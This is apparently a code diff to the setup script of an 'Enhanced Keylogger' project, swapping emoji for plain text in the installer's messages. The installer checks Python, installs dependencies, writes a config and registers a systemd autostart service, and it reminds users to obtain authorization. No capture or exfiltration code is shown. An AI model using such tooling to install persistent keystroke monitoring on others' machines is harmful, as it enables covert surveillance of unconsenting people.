@@ -24,11 +24,11 @@ class KeyloggerSetup:
     def check_python_version(self) -> bool:
         """Check if Python version is compatible."""
         if sys.version_info < (3, 8):
-            print("❌ Error: Python 3.8 or higher is required.")
+            print("ERROR: Python 3.8 or higher is required.")
             print(f"Current version: {sys.version}")
             return False
         
-        print(f"✅ Python version check passed: {sys.version.split()[0]}")
+        print(f"Python version check passed: {sys.version.split()[0]}")
         return True
     
     def create_directories(self) -> bool:
@@ -48,7 +48,7 @@ class KeyloggerSetup:
             
             for directory in directories:
                 directory.mkdir(exist_ok=True)
-                print(f"✅ Created directory: {directory}")
+                print(f"Created directory: {directory}")
             
             # Set restrictive permissions on keys directory
             if os.name != 'nt':  # Unix-like systems
@@ -57,7 +57,7 @@ class KeyloggerSetup:
             return True
             
         except Exception as e:
-            print(f"❌ Error creating directories: {e}")
+            print(f"ERROR creating directories: {e}")
             return False
     
     def install_dependencies(self) -> bool:
@@ -67,7 +67,7 @@ class KeyloggerSetup:
                 print("❌ Error: requirements.txt not found")
                 return False
             
-            print("📦 Installing Python dependencies...")
+            print("Installing Python dependencies...")
             
             # Upgrade pip first
             subprocess.run([
@@ -79,27 +79,27 @@ class KeyloggerSetup:
                 sys.executable, '-m', 'pip', 'install', '-r', str(self.requirements_file)
             ], check=True, capture_output=True, text=True)
             
-            print("✅ Dependencies installed successfully")
+            print("Dependencies installed successfully")
             return True
             
         except subprocess.CalledProcessError as e:
-            print(f"❌ Error installing dependencies: {e}")
+            print(f"ERROR installing dependencies: {e}")
             if e.stdout:
                 print(f"STDOUT: {e.stdout}")
             if e.stderr:
                 print(f"STDERR: {e.stderr}")
             return False
         except Exception as e:
-            print(f"❌ Unexpected error: {e}")
+            print(f"Unexpected error: {e}")
             return False
     
     def create_default_config(self) -> bool:
         """Create default configuration file."""
         try:
             if self.config_file.exists():
-                response = input("⚠️  config.json already exists. Overwrite? (y/N): ")
+                response = input("WARNING: config.json already exists. Overwrite? (y/N): ")
                 if response.lower() != 'y':
-                    print("✅ Keeping existing configuration")
+                    print("Keeping existing configuration")
                     return True
             
             default_config = {
@@ -343,18 +343,18 @@ WantedBy=multi-user.target
             with open(service_file, 'w') as f:
                 f.write(service_content)
             
-            print(f"✅ Created systemd service: {service_file}")
+            print(f"Created systemd service: {service_file}")
             print("   Enable with: systemctl --user enable enhanced-keylogger.service")
             
         except Exception as e:
-            print(f"❌ Error setting up Unix autostart: {e}")
+            print(f"ERROR setting up Unix autostart: {e}")
     
     def print_next_steps(self):
         """Print next steps for the user."""
         print("\n" + "="*60)
-        print("🎉 SETUP COMPLETE!")
+        print("SETUP COMPLETE!")
         print("="*60)
-        print("\n📋 Next Steps:")
+        print("\nNext Steps:")
         print("\n1. Review and customize configuration:")
         print(f"   Edit: {self.config_file}")
         print("\n2. Start the keylogger:")
@@ -369,18 +369,18 @@ WantedBy=multi-user.target
         print("   python tests/test_keylogger.py")
         print("\n5. View logs:")
         print(f"   Location: {self.logs_dir}")
-        print("\n⚠️  IMPORTANT REMINDERS:")
+        print("\nIMPORTANT REMINDERS:")
         print("   - Change default web interface password")
         print("   - Review privacy settings in config.json")
         print("   - Ensure you have proper authorization to monitor")
         print("   - Comply with local privacy laws")
-        print("\n📖 Documentation: README.md")
-        print("🐛 Issues: Report via GitHub Issues")
+        print("\nDocumentation: README.md")
+        print("Issues: Report via GitHub Issues")
         print("\n" + "="*60)
     
     def run_setup(self) -> bool:
         """Run the complete setup process."""
-        print("🚀 Enhanced Keylogger Setup")
+        print("Enhanced Keylogger Setup")
         print("="*40)
         
         steps = [
@@ -394,9 +394,9 @@ WantedBy=multi-user.target
         ]
         
         for step_name, step_func in steps:
-            print(f"\n📋 {step_name}...")
+            print(f"\nStarting: {step_name}...")
             if not step_func():
-                print(f"❌ Setup failed at: {step_name}")
+                print(f"Setup failed at: {step_name}")
                 return False
         
         self.print_next_steps()
@@ -411,10 +411,10 @@ def main():
         sys.exit(0 if success else 1)
         
     except KeyboardInterrupt:
-        print("\n❌ Setup interrupted by user")
+        print("\nSetup interrupted by user")
         sys.exit(1)
     except Exception as e:
-        print(f"❌ Unexpected error during setup: {e}")
+        print(f"Unexpected error during setup: {e}")
         sys.exit(1)
 
 
